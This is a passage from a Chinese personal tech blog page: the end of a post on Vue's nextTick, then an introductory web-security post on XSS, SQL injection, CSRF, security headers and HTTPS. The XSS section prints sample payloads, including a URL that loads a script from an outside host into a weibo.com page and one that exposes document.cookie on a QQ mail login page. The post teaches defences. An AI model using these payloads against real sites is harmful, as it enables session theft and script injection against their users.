class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>next-tick.js 申明了 microTimerFunc 和 macroTimerFunc 2 个变量，它们分别对应的是 micro task 的函数和 macro task 的函数。对于 macro task 的实现，优先检测是否支持原生 setImmediate，这是一个高版本 IE 和 Edge 才支持的特性，不支持的话再去检测是否支持原生的 MessageChannel，如果也不支持的话就会降级为 setTimeout 0；而对于 micro task 的实现，则检测浏览器是否原生支持 Promise，不支持的话直接指向 macro task 的实现。</p>
<p>next-tick.js 对外暴露了 2 个函数，先来看 nextTick，这就是我们在上一节执行 nextTick(flushSchedulerQueue) 所用到的函数。它的逻辑也很简单，把传入的回调函数 cb 压入 callbacks 数组，最后一次性地根据 useMacroTask 条件执行 macroTimerFunc 或者是 microTimerFunc，而它们都会在下一个 tick 执行 flushCallbacks，flushCallbacks 的逻辑非常简单，对 callbacks 遍历，然后执行相应的回调函数。</p>
<p>这里使用 callbacks 而不是直接在 nextTick 中执行回调函数的原因是保证在同一个 tick 内多次执行 nextTick，不会开启多个异步任务，而把这些异步任务都压成一个同步任务，在下一个 tick 执行完毕。</p>

                                    

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E7%90%86%E8%AE%BA/" rel="tag">前端理论</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
    <article id="post-安全" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
      <header class="article-header">
         
<h2 itemprop="name">
  <a class="article-title" href="/2018/12/22/%E5%AE%89%E5%85%A8/"
    >Web安全</a
  >
</h2>
  

      </header>
      

        
          <div class="article-meta">
            <a href="/2018/12/22/%E5%AE%89%E5%85%A8/" class="article-date">
  <time datetime="2018-12-21T16:15:28.000Z" itemprop="datePublished">2018-12-22</time>
</a>
              
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF%E7%90%86%E8%AE%BA/">前端理论</a>
  </div>

                
                  
                    
          </div>
          

            

                  <div class="article-entry" itemprop="articleBody">
                    


                      

                        
                                  <h1 id="web安全"><a href="#web安全" class="headerlink" title="web安全"></a>web安全</h1><ol>
<li><p>xss攻击   </p>
<ul>
<li><p>借助js实现的攻击，在服务端没有对 &lt;&gt; 进行转译显示的时候发生。导致黑客可以在别人的浏览器上运行任意js代码。</p>
</li>
<li><p>解决方案：在网页内容输出的时候做转译，将&lt;&gt;转译为<code>&amp;lt;</code> 和 <code>&amp;gt;</code></p>
</li>
<li><p>nodejs中通过escape库简单搞定</p>
</li>
</ul>
</li>
<li><p>sql注入攻击</p>
<ul>
<li>利用服务端拼接sql字符串，拼接出各种sql，在服务端执行。使服务端数据泄露，甚至被任意篡改。    </li>
<li>解决方案：sql预编译。</li>
</ul>
</li>
<li><p>响应头设置<code>x-frame-options</code>  </p>
<ul>
<li>限制当前页面被其他页面以iframe引用</li>
</ul>
</li>
<li><p>响应头设置<code>content-security-policy</code></p>
<ul>
<li>限制当前页面去引用其他页面资源</li>
</ul>
</li>
</ol>
<p><a href="https://github.com/sunwu51/WebSecurity" target="_blank" rel="noopener">参考github</a></p>
<h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p> <a href="https://tech.meituan.com/2018/09/27/fe-security.html" target="_blank" rel="noopener">XSS攻击</a>: 注入恶意代码</p>
<pre><code>* 分类
    * 存储型XSS 
        * 攻击者将恶意代码提交到目标网站的数据库中。
        * 用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器
    * 反射型XSS
        * 攻击者构造出特殊的 URL，其中包含恶意代码。
        * 用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。（比如URL中的参数）
    * DOM型XSS
        * 攻击者构造出特殊的 URL，其中包含恶意代码。
        * 用户打开带有恶意代码的 URL。
        * 用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
* 解决
    * 转义页面上的输入内容和输出内容
    * cookie 设置 httpOnly,禁止javascript读取cookie
    * 设置验证码，防止脚本冒充提交危险操作</code></pre><p>例如：</p>
<p>攻击者发现 <code>http://weibo.com/pub/star/g/xyyyd</code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p>
<p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p>
<p><code>http://weibo.com/pub/star/g/xyyyd&quot;&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://weibo.com/pub/star/g/xyyyd"</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//xxxx.cn/image/t.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><span class="string">"&gt;按分类检索&lt;/a&gt;&lt;/li&gt;</span></span><br></pre></td></tr></table></figure>
<p>攻击者发现<code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</code> 这个 URL 的参数 uin、domain 未经转义直接输出到 HTML 中。</p>
<p>于是攻击者构建出一个 URL，并引导用户去点击： <code>http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p>
<p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">getTop().location.href=<span class="string">"/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa"</span>+<span class="string">"&amp;t="</span>+<span class="string">"&amp;d=bbbb"</span>;<span class="keyword">return</span> <span class="literal">false</span>;&lt;<span class="regexp">/script&gt;&lt;script&gt;alert(document.cookie)&lt;/</span>script&gt;<span class="string">"+"</span>...</span><br></pre></td></tr></table></figure>
<p>用户通过文本框输入的信息来显示在页面上，那么在文本框输入如下内容<br><code>&lt;img src = &quot;abc&quot; onerror = &quot;alert(1)&quot; /&gt;</code></p>
<pre><code></code></pre><h4 id="CSRF-跨站请求伪造，防护"><a href="#CSRF-跨站请求伪造，防护" class="headerlink" title="CSRF: 跨站请求伪造，防护:"></a>CSRF: 跨站请求伪造，防护:</h4><p>简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p>
<ul>
<li>解决办法<ul>
<li>验证HTTP Referer<ul>
<li>Referer字段记录请求来源地址 检验是否是同一个源</li>
</ul>
</li>
<li>在请求地址中添加takon验证<ul>
<li>HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token</li>
<li>服务器现在页面埋入特定标志，在用户请求时带上此标记，来判断请求是否合法</li>
</ul>
</li>
<li>不被第三方网站访问到用户的cookie sameSite标记</li>
</ul>
</li>
</ul>
<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p><a href="https://www.bilibili.com/video/av66187268" target="_blank" rel="noopener">参考视频</a><br>明文传输：裸奔<br>对称加密：key唯一=明文<br>非对称加密： 服务端到客户端的传输不安全<br>非对称协商key+key用来对称加密：中间人劫持问题<br><img src="http://103.14.34.148:9000/imgs/blog/img/%E5%AF%B9%E7%A7%B0%E4%B8%8E%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86.jpg" alt=""><br>HTTPS：CA的csk认证服务端pk得到license+客户端操作系统cpk解析license得pk，pk加密非对称协商key+key用来对称加密<br><img src="http://103.14.34.148:9000/imgs/blog/img/https.jpg" alt=""></p>

                                    

                                      <!-- copyright -->
                                      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF%E7%90%86%E8%AE%BA/" rel="tag">前端理论</a></li></ul>


    </footer>

  </div>

  

  

  

</article>
    
  </article>
  

  
  <nav class="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/2/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">下一页</a>
  </nav>
  
</section>
</div>


          <div class="to_top">
            <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>
          </div>
      </main>
      <aside class="sidebar">
        <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/ayer-side.svg" alt="Matt&#39;s Blog"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/resume">关于我</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="http://103.14.34.148:9001/" target="_blank" rel="noopener">项目展示</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
      </aside>
      <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
        
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<script src="/js/share.js"></script>



<script src="/fancybox/jquery.fancybox.min.js"></script>




<script>
  try {
    var typed = new Typed("#subtitle", {
    strings: ['https://github.com/chiangming/','sa517144@mail.ustc.edu.cn',''],
    startDelay: 0,
    typeSpeed: 200,
    loop: true,
    backSpeed: 100,
    showCursor: true
    });
  } catch (err) {
  }
  
</script>




<script>
  var ayerConfig = {
    mathjax: false
  }
</script>


<script src="/js/ayer.js"></script>


<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>




<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
    </div>
  </body>

  </html>